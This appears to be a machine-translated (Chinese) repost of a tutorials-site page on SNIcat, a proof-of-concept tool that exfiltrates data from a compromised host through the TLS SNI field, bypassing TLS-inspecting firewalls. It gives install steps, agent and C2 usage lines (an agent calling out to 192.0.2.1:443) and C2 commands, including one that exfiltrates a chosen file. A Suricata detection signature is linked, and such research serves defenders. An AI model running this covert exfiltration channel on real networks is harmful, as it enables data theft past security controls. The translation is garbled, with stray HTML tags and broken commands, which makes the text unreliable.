# SNIcat:服务器名称指示连接器

> 原文：<https://kalilinuxtutorials.com/snicat/>

[![SNIcat : Server Name Indication Concatenator](img/66f40b013a13299458a790b356cfdfb1.png "SNIcat : Server Name Indication Concatenator")](https://1.bp.blogspot.com/-pYNagw_4PfY/X1XGT9Ayo0I/AAAAAAAAHe0/GVr5EGMloyI5c2VMOSUYiytPMKQdPZS3ACLcBGAsYHQ/s728/SNIcat%25281%2529.png)

**SNIcat** 是一款概念验证工具，利用隐蔽通道方法通过以下方式执行数据渗透。*服务器名称指示*，一个 **TLS 客户端 Hello 扩展**。

该工具由一个驻留在被入侵的内部主机上的**代理**和一个控制代理并收集泄露数据的**命令&控制**服务器组成。

**背景&场景**

我们发现了一种新的隐蔽的数据渗透方法，它专门绕过安全边界解决方案，如 web 代理、下一代防火墙(NGFW)和 TLS 拦截和检查的专用解决方案。我们的测试验证了这是一个普遍存在的问题，它会影响不同类型的安全解决方案以及来自不同供应商的解决方案。我们针对 F5 Networks、Palo Alto Networks 和 Fortinet 的产品成功测试了我们的技术，并推测许多其他供应商也容易受到影响。

通过使用我们的渗透方法 SNIcat，我们发现我们可以绕过执行 TLS 检查的安全边界解决方案，即使我们使用的命令和控制(C2)域被安全解决方案本身内置的通用信誉和威胁防御功能阻止。简而言之，我们发现旨在保护用户的解决方案给他们带来了新的漏洞。

我们还提供了一个 [Suricata 签名](https://github.com/mnemonic-no/SNIcat/blob/master/signatures/snicat.rules)来检测这个特定的工具。

**安装**

*   **克隆存储库:**

**https://github.com/mnemonic-no/SNIcat.git**

*   **安装依赖项:**

**pip 3 install-r requirements . txt–用户**

**初始设置**

*   **C2**

从公开信任的 CA 获取通配符证书和密钥。这表示好证书和好证书密钥。利用自签名证书和密钥(不在任何信任存储中)作为 BAD_CERT 和 BAD_CERT_KEY。

**(*)用法:**' python 3 sni cat _ C2 . py<listening_port><good_cert><good_cert_key><bad_cert><bad_cert_key>log = { on | off } '</bad_cert_key></bad_cert></good_cert_key></good_cert></listening_port>
<listening_port><good_cert><good_cert_key><bad_cert><bad_cert_key>**(*)示例:**' python 3 sni cat _ C2 _ final . py 443 certs/good . PEM certs/good . key certs/SSL-cert-snake oil . PEM log = 1</bad_cert_key></bad_cert></good_cert_key></good_cert></listening_port>

*   **代理人**

**(*)用法:**' python 3 snicat _ agent . py<c2_server_ip><c2_server_port>log = { on | off } '</c2_server_port></c2_server_ip>
<c2_server_ip><c2_server_port>**(*)举例:**' python 3 snicat _ agent . py 192.0.2.1 443 log = off '</c2_server_port></c2_server_ip>

**用途**

C2 可用命令

**LIST—**显示当前文件夹中的所有内容
**LS—**仅显示当前文件夹中的文件
**SIZE—**显示当前文件夹中文件的大小
**LD—**显示当前文件夹中的每个目录
**CB—**向下移动到根树文件夹中—类似于“cd ..”
**CD<folder-id>–</folder-id>**<folder-id>上移指定文件夹</folder-id>
<folder-id>**EX<file-id>–</file-id>**<file-id>exculate 指定文件</file-id></folder-id>
<folder-id><file-id>**ALIVE—**check ALIVE/dead agent</file-id>
<folder-id><file-id>**EXIT—**退出 C2 服务器</file-id></folder-id></folder-id>

[**Download**](https://github.com/mnemonic-no/SNIcat)